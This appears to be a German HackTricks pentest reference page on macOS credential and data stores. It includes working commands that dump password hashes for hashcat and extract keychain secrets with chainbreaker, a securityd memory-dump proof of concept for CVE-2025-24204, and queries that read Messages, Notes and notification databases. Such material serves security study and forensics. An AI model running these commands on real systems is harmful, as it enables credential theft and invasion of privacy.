# Sensible Speicherorte und interessante Daemons unter macOS

{{#include ../../../banners/hacktricks-training.md}}


## Passwörter

### Schattenpasswörter

Das Schattenpasswort wird zusammen mit der Benutzerkonfiguration in Plists unter **`/var/db/dslocal/nodes/Default/users/`** gespeichert.\
Mit der folgenden Einzeile lassen sich **alle Informationen zu den Benutzern** (einschließlich Hash-Informationen) ausgeben:

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**Skripte wie dieses**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) oder [**dieses hier**](https://github.com/octomagon/davegrohl.git) können verwendet werden, um den Hash in das **hashcat-Format** umzuwandeln.

Eine alternative Einzeiler-Lösung, die Zugangsdaten aller Nicht-Dienstkonten im hashcat-Format `-m 7100` (macOS PBKDF2-SHA512) ausgibt:

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

Eine weitere Möglichkeit, die `ShadowHashData` eines Benutzers zu erhalten, ist `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Kopierte ShadowHashData unter Linux konvertieren

Wenn das Attribut auf einen Linux-Cracking-Host kopiert wurde, speichere **nur die hexadezimalen Bytes** (nicht das Label `ShadowHashData:`) in `shadowhash.hex`. Unter Ubuntu wandelt `libplist-utils` die dekodierte binäre plist ohne das macOS-Tool `plutil` in lesbares XML um.<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

Verwende im XML `iterations` sowie das Base64-`salt` und die Base64-`entropy` aus **`SALTED-SHA512-PBKDF2`**, nicht den separaten SRP-Verifier. Setze `salt_b64` und `entropy_b64` auf den jeweiligen Inhalt der XML-Elemente `<data>`. Wandle sie in Hex um und bilde eine Zeile im Format `$ml$<iterations>$<salt_hex>$<entropy_hex>` für den Hashcat-Modus `7100`. Dies ist Offline-Guessing nach privilegierter Hash-Beschaffung, keine Methode für Initial Access oder Privilege Escalation.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

Diese Datei wird **nur verwendet**, wenn das System im **Single-User-Modus** läuft (also nicht sehr häufig).

### Keychain Dump

Beachte, dass bei Verwendung des security-Binaries zum **Entschlüsseln der Passwörter** mehrere Eingabeaufforderungen angezeigt werden, in denen der Benutzer diesen Vorgang erlauben soll.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

Auf modernem macOS sind **`~/Library/Keychains/login.keychain-db`** und **`/Library/Keychains/System.keychain`** in der Regel die interessantesten Speicherdateien. Sie basieren auf SQLite, aber der Klartextzugriff wird weiterhin von **`securityd`** vermittelt: Der Diebstahl der rohen DB liefert hauptsächlich Metadaten und verschlüsselte Blobs, sofern nicht zusätzlich das Passwort des Benutzers, der `SystemKey` oder ein im Speicher befindlicher Master Key wiederhergestellt wird.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Aufgrund dieses Kommentars [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) sieht es so aus, als würden diese Tools unter Big Sur nicht mehr funktionieren.

### Überblick über Keychaindump

Ein Tool namens **keychaindump** wurde entwickelt, um Passwörter aus macOS-Keychains auszulesen. Es unterliegt jedoch Einschränkungen bei neueren macOS-Versionen wie Big Sur, wie aus einer [Diskussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) hervorgeht. Für den Einsatz von **keychaindump** muss der Angreifer Zugriff erlangen und seine Berechtigungen bis auf **root** erweitern. Das Tool nutzt aus, dass die Keychain beim Anmelden des Benutzers standardmäßig entsperrt wird, damit Anwendungen ohne wiederholte Eingabe des Benutzerpassworts darauf zugreifen können. Wenn ein Benutzer seine Keychain jedoch nach jeder Verwendung sperren lässt, ist **keychaindump** wirkungslos.

**Keychaindump** zielt auf einen bestimmten Prozess namens **securityd** ab, den Apple als Daemon für Autorisierungs- und kryptografische Vorgänge beschreibt und der für den Zugriff auf die Keychain entscheidend ist. Beim Auslesen wird ein **Master Key** gesucht, der aus dem Anmeldepasswort des Benutzers abgeleitet wird. Dieser Schlüssel ist erforderlich, um die Keychain-Datei zu lesen. Um den **Master Key** zu finden, durchsucht **keychaindump** den Speicher-Heap von **securityd** mithilfe des Befehls `vmmap` nach möglichen Schlüsseln in Bereichen, die als `MALLOC_TINY` gekennzeichnet sind. Mit dem folgenden Befehl werden diese Speicherbereiche untersucht:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

Nachdem **keychaindump** potenzielle Master-Schlüssel identifiziert hat, durchsucht es die Heaps nach einem bestimmten Muster (`0x0000000000000018`), das auf einen möglichen Master-Schlüssel hinweist. Um diesen Schlüssel verwenden zu können, sind weitere Schritte erforderlich, darunter die Entschleierung, wie im Quellcode von **keychaindump** beschrieben. Analysten, die sich auf diesen Bereich konzentrieren, sollten beachten, dass die entscheidenden Daten zum Entschlüsseln des Schlüsselbunds im Speicher des Prozesses **securityd** abgelegt sind. Ein Beispielbefehl zum Ausführen von **keychaindump** lautet:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kann die folgenden Informationstypen auf forensisch fundierte Weise aus einem macOS-Keychain extrahieren:

- Gehashtes Keychain-Passwort, geeignet zum Cracken mit [hashcat](https://hashcat.net/hashcat/) oder [John the Ripper](https://www.openwall.com/john/)
- Internet-Passwörter
- Generische Passwörter
- Private Schlüssel
- Öffentliche Schlüssel
- X509-Zertifikate
- Secure Notes
- Appleshare-Passwörter

Mit dem Keychain-Entsperrpasswort, einem mit [volafox](https://github.com/n0fate/volafox) oder [volatility](https://github.com/volatilityfoundation/volatility) ermittelten Master Key oder einer Entsperrdatei wie SystemKey kann Chainbreaker auch Passwörter im Klartext bereitstellen.

Ohne eine dieser Methoden zum Entsperren des Keychain zeigt Chainbreaker alle anderen verfügbaren Informationen an.

#### **Keychain-Schlüssel ausgeben**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Schlüsselbundschlüssel (mit Passwörtern) mit SystemKey dumpen**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump von keychain keys (mit Passwörtern) und Cracking des Hashes**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Keychain-Schlüssel (mit Passwörtern) mit einem Speicherabbild auslesen**

[Follow these steps](../index.html#dumping-memory-with-osxpmem), um ein **Speicherabbild** zu erstellen.

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Keychain-Schlüssel (mit Passwörtern) mithilfe des Benutzerpassworts dumpen**

Wenn du das Passwort des Benutzers kennst, kannst du die Keychains des Benutzers dumpen und entschlüsseln.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### Keychain-Masterschlüssel über `gcore`-Entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) wurde mit `/usr/bin/gcore` ausgeliefert, das über das **`com.apple.system-task-ports.read`**-Entitlement verfügte. Dadurch konnte jeder lokale Administrator (oder eine bösartige, signierte App) **den Speicher eines beliebigen Prozesses auslesen, selbst wenn SIP/TCC erzwungen wurden**. Das Auslesen von `securityd` gibt den **Keychain-Masterschlüssel im Klartext preis** und ermöglicht es, `login.keychain-db` ohne das Benutzerpasswort zu entschlüsseln.<sup>[[1]](#references)</sup>

**Schnelltest auf verwundbaren Builds (15.0–15.2):**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Gib den extrahierten Hex-Schlüssel an Chainbreaker weiter (`--key <hex>`), um den Login-Schlüsselbund zu entschlüsseln. Apple hat das Entitlement in **macOS 15.3+** entfernt. Daher funktioniert dies nur auf ungepatchten Sequoia-Versionen oder Systemen, auf denen die anfällige Binärdatei erhalten geblieben ist.

### kcpassword

Die Datei **kcpassword** enthält das **Login-Passwort des Benutzers**, aber nur, wenn der Systembesitzer **automatische Anmeldung aktiviert** hat. Der Benutzer wird dann automatisch angemeldet, ohne nach einem Passwort gefragt zu werden (was nicht besonders sicher ist).

Das Passwort wird in der Datei **`/etc/kcpassword`** gespeichert und mit dem Schlüssel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** per XOR verknüpft. Ist das Passwort des Benutzers länger als der Schlüssel, wird der Schlüssel wiederverwendet.\
Dadurch lässt sich das Passwort ziemlich leicht wiederherstellen, zum Beispiel mit Skripten wie [**diesem**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interessante Informationen in Datenbanken

### Nachrichten

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Benachrichtigungen

Vor **Sequoia** befindet sich der Notification-Center-Speicher normalerweise unter **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. Ab **Sequoia+** hat Apple ihn in den TCC-geschützten Gruppencontainer **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** verschoben.

Die meisten interessanten Informationen sind in **blob**-Spalten gespeichert. Daher müssen Sie diese Inhalte extrahieren und in ein menschenlesbares Format umwandeln (`plutil -p -`, `strings` oder einen kleinen Parser). Beispiele für eine schnelle Triage:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### Aktuelle Datenschutzprobleme (NotificationCenter DB)

- In macOS **14.7–15.1** speicherte Apple Bannerinhalte in der SQLite-Datenbank `db2/db` ohne angemessene Schwärzung. Die CVEs **CVE-2024-44292/44293/40838/54504** ermöglichten jedem lokalen Benutzer, den Benachrichtigungstext anderer Benutzer zu lesen, indem er einfach die Datenbank öffnete (ohne TCC-Abfrage).<sup>[[3]](#references)</sup>
- Apple entschärfte das Problem, indem die Datenbank in `group.com.apple.usernoted` verschoben und auf neueren Sequoia-Builds durch TCC geschützt wurde. Auf aktuellen Systemen benötigt man daher normalerweise den passenden Benutzerkontext oder einen TCC bypass, um sie zu lesen.<sup>[[4]](#references)</sup>
- Kopiere auf älteren Endgeräten die Dateien `db`, `db-wal` und `db-shm` gemeinsam, bevor du ein Update durchführst oder neu startest, wenn du die Artefakte erhalten möchtest.

### Hinweise

Die **Notizen** der Benutzer befinden sich unter `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

Wenn die obige Ein-Zeilen-Lösung zu viele Ausgaben erzeugt, exportiere `ZICNOTEDATA.ZDATA`, entpacke sie mit gunzip und parse das Protobuf: Das ist in der Regel zuverlässiger, als `strings` direkt auf der SQLite-Datei auszuführen.

### Hintergrundaufgaben / Anmeldeobjekte

Seit **Ventura** werden vom Benutzer genehmigte Anmeldeobjekte und mehrere Hintergrundaufgaben in **BTM**-Speichern erfasst, etwa **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** und im versionierten System-Cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Diese Dateien eignen sich dazu, schnell Persistenz, Hilfsprogramme und einige von MDM verwaltete Hintergrundobjekte zu identifizieren:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

Für den Persistenzaspekt und die BTM-Interna siehe [die Seite zu Auto-Start-Orten](../../macos-auto-start-locations.md#login-items) und [die Hinweise zu Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Einstellungen

In macOS-Apps befinden sich die Einstellungen unter **`$HOME/Library/Preferences`** und in iOS unter `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

In macOS kann das CLI-Tool **`defaults`** verwendet werden, um die Einstellungsdatei zu **ändern**.

**`/usr/sbin/cfprefsd`** beansprucht die XPC-Dienste `com.apple.cfprefsd.daemon` und `com.apple.cfprefsd.agent` und kann aufgerufen werden, um Aktionen wie das Ändern von Einstellungen auszuführen.

## OpenDirectory permissions.plist

Die Datei `/System/Library/OpenDirectory/permissions.plist` enthält Berechtigungen für Knotenattribute und wird durch SIP geschützt.\
Diese Datei gewährt bestimmten Benutzern anhand ihrer UUID (und nicht ihrer uid) Berechtigungen, damit sie auf bestimmte sensible Informationen wie `ShadowHashData`, `HeimdalSRPKey` und `KerberosKeys` zugreifen können:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## Systembenachrichtigungen

### Darwin-Benachrichtigungen

Der wichtigste Daemon für Benachrichtigungen ist **`/usr/sbin/notifyd`**. Um Benachrichtigungen zu empfangen, müssen Clients sich über den Mach-Port `com.apple.system.notification_center` registrieren (mit `sudo lsmp -p <pid notifyd>` überprüfen). Der Daemon lässt sich über die Datei `/etc/notify.conf` konfigurieren.

Die für Benachrichtigungen verwendeten Namen sind eindeutige Reverse-DNS-Bezeichnungen. Wird eine Benachrichtigung an einen dieser Namen gesendet, empfangen die Clients, die angegeben haben, sie verarbeiten zu können, die Benachrichtigung.

Der aktuelle Status lässt sich ausgeben (und alle Namen lassen sich anzeigen), indem das Signal SIGUSR2 an den Prozess notifyd gesendet und die generierte Datei `/var/run/notifyd_<pid>.status` gelesen wird:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

Das **Distributed Notification Center**, dessen Haupt-Binary **`/usr/sbin/distnoted`** ist, ist eine weitere Möglichkeit, Benachrichtigungen zu senden. Es stellt einige XPC-Dienste bereit und führt einige Prüfungen durch, um Clients zu verifizieren.

### Apple Push Notifications (APN)

In diesem Fall können sich Anwendungen für **Themen** registrieren. Der Client generiert ein Token, indem er über **`apsd`** Kontakt zu den Servern von Apple aufnimmt.\
Anschließend generieren auch die Anbieter ein Token und können sich mit den Servern von Apple verbinden, um Nachrichten an die Clients zu senden. Diese Nachrichten werden lokal von **`apsd`** empfangen, das die Benachrichtigung an die darauf wartende Anwendung weiterleitet.

Die Einstellungen befinden sich in `/Library/Preferences/com.apple.apsd.plist`.

In macOS befindet sich eine lokale Nachrichtendatenbank unter `/Library/Application\ Support/ApplePushService/aps.db` und in iOS unter `/var/mobile/Library/ApplePushService`. Sie enthält 3 Tabellen: `incoming_messages`, `outgoing_messages` und `channel`.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

Außerdem lassen sich mit Folgendem Informationen über den Daemon und die Verbindungen abrufen:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## Benutzerbenachrichtigungen

Diese Benachrichtigungen werden dem Benutzer auf dem Bildschirm angezeigt:

- **`CFUserNotification`**: Diese APIs bieten eine Möglichkeit, ein Pop-up mit einer Nachricht auf dem Bildschirm anzuzeigen.
- **The Bulletin Board**: Zeigt in iOS ein Banner an, das verschwindet und im Notification Center gespeichert wird.
- **`NSUserNotificationCenter`**: Der veraltete Notification-Center-Dienst unter macOS. Bei älteren Versionen befindet sich die Datenbank normalerweise unter `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; ab Sequoia befindet sie sich unter `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [1] [HelpNetSecurity – macOS-gcore-Entitlement ermöglichte das Extrahieren des Keychain-Masterschlüssels (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Datenschutz von Keychain-Daten](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Offenlegung von Daten aus der Notification-Center-SQLite-Datenbank (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple geht Datenschutzbedenken bezüglich der Notification-Center-Datenbank in macOS Sequoia an](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – macOS-Passwort-Cracking](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Hashcat-Beispiel-Hashes – macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
